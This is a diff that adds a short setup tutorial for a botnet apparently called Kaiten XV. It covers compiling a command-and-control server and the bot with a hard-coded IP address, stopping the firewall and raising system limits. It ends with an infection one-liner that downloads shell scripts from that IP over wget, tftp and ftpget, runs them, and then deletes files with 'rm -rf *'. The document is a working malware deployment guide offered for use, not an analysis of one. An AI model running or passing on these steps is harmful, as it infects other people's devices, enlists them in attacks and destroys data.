@@ -1,0 +1,26 @@
+Kaiten XV Tutorial
+
+Put server Ip in bot.c	>> located above all the useragents					 
+
+yum install python-paramiko nano screen gcc perl wget lbzip bzip2 unzip httpd -y
+yum install deltarpm  (only when using centos 7)
+yum update
+
+gcc c2.c -o cnc -pthread; rm -rf c2.c
+
+service iptables stop
+service httpd restart
+
+nano /usr/include/bits/typesizes.h
+scroll down and edit the 1024 to 999999
+THEN SAVE IT 
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+passwd
+python compile.py bot.c 94.158.244.36 
+
+passwd
+
+screen ./cnc botport threads cncport
+
+
+Your link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.158.244.36/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 94.158.244.36 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.158.244.36; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.158.244.36 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
